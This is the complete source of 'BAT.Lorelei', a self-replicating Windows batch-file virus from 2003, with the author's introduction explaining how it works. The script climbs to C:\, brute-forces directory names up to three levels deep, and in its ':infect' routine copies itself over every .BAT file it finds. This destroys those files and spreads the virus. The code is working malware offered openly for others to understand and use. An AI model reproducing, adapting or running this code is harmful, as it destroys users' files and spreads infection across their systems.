  BAT.Lorelei
  by Second Part To Hell[rRlf]
  www.spth.de.vu
  spth@aonmail.at
  written on 25.07.2003
  in Austria

  In my oppinion this is no real virus, but a new, neverseen engine.
  It searchs in the next 3 directorys for bat-files. It searchs the directory names
  in a bruteforce way. That's also the reason, why it needs very long to run (about 45sec
  at my 1.400MHz). Now let me show you, what I mean:
  ---
  C:\asterix\obelix\idefix\roma
            \zzz
    \windows\system\...
    \programs
  ---
  It will infect every .BAT file in the directories (C:\*.* | C:\asterix\*.* | C:\asterix\obelix\*.* |
  C:\asterix\obelix\idefix\*.*). The engine isn't perfect now, but I don't want to work on it anymore.
  But a perfect version of that would be the same as the command 'for /r C: ...' in Win00|XP|NT.
  Unfortunately I had no time to test it at Win 9x, but at WinXP it works fine, so I guess, it should also
  work on Win9x, because I didn't use any special commands.
  One other thing is the 'goto %BackJmpLable%'. You are able to do cool things with that. And you're also
  able to shourt your codes alot.

  OK, I think, that's everything. I wish you fun while you are trying to understand this :)


--------------------------------------< BAT.Lorelei >--------------------------------------
cls
@echo off
set saveA=Lorelei
set saveB=Lorelei
set saveC=Lorelei
set buffer=Loro
:Again
set counter=%counter%!
if %counter%==!!! exit
set count=Lorelei
set StageA=StageA
set StageB=StageB
set StageC=StageC
set exspth=exspth
:GetRoot
cd..
set GRcheck=%GRcheck%x
if %GRcheck%==xxxxxxxx goto GotRoot
goto GetRoot
:GotRoot
set GRcheck=
C:
set spth=C:\
set Oldspth=%spth%
set BackJmpLable=DirCheck
goto infect

:DirCheck
dir %spth%* >C:\Lorelei
find "<DIR>" C:\Lorelei>trash
set ThOfTr=a
if %spth%==%exspth% set ThOfTr=gothic
if NOT ERRORLEVEL 1 set BackJmpLable=SetDirCheck
if NOT ERRORLEVEL 1 set Oldspth=%spth%
if NOT ERRORLEVEL 1 goto AddNewLetter
set spth=%Oldspth%
goto DirCheck

:SetDirCheck
cd %spth%>trash
if NOT ERRORLEVEL 1 set BackJmpLable=SDCfinish
if NOT ERRORLEVEL 1 goto infect
goto DirCheck

:SDCfinish
if %spth%==%saveA% set ThOfTr=e
if %spth%==%saveB% set ThOfTr=e
if %spth%==%saveC% set ThOfTr=e
if %ThOfTr%==e set spth=%Oldspth%
if %ThOfTr%==e goto DirCheck
set SDCvar=SDCvar
if NOT %StageA%==Lorelei set SDCvar=1
if %SDCvar%==1 set StageA=Lorelei
if %SDCvar%==1 goto Savevar
if NOT %StageB%==Lorelei set SDCvar=2
if %SDCvar%==2 set StageB=Lorelei
if %SDCvar%==2 goto Savevar
if NOT %StageC%==Lorelei set SDCvar=3
if %SDCvar%==3 set StageC=Lorelei
if %SDCvar%==3 goto SaveVar
exit


:AddNewLetter
set ThOfTr=a
set AddNewLetterVar=%AddNewLetterVar%y
if %AddNewLetterVar%==y if %exspth%==%spth% if %count%==! goto Again
if %AddNewLetterVar%==y if %exspth%==%spth% set count=!
if %AddNewLetterVar%==y set exspth=%spth%
if %AddNewLetterVar%==y set spth=%spth%a
if %AddNewLetterVar%==yy set spth=%spth%b
if %AddNewLetterVar%==yyy set spth=%spth%c
if %AddNewLetterVar%==yyyy set spth=%spth%d
if %AddNewLetterVar%==yyyyy set spth=%spth%e
if %AddNewLetterVar%==yyyyyy set spth=%spth%f
if %AddNewLetterVar%==yyyyyyy set spth=%spth%g
if %AddNewLetterVar%==yyyyyyyy set spth=%spth%h
if %AddNewLetterVar%==yyyyyyyyy set spth=%spth%i
if %AddNewLetterVar%==yyyyyyyyyy set spth=%spth%j
if %AddNewLetterVar%==yyyyyyyyyyy set spth=%spth%k
if %AddNewLetterVar%==yyyyyyyyyyyy set spth=%spth%l
if %AddNewLetterVar%==yyyyyyyyyyyyy set spth=%spth%m
if %AddNewLetterVar%==yyyyyyyyyyyyyy set spth=%spth%n
if %AddNewLetterVar%==yyyyyyyyyyyyyyy set spth=%spth%o
if %AddNewLetterVar%==yyyyyyyyyyyyyyyy set spth=%spth%p
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyy set spth=%spth%q
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyy set spth=%spth%r
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyy set spth=%spth%s
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyy set spth=%spth%t
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyy set spth=%spth%u
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyy set spth=%spth%v
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%w
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%x
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%y
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%z
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyyy set AddNewLetterVar=
goto %BackJmpLable%

:SaveVar
set spth=%spth%\
goto DirCheck


:infect
for %%a in (*.bat) do copy %0 %%a
goto %BackJmpLable%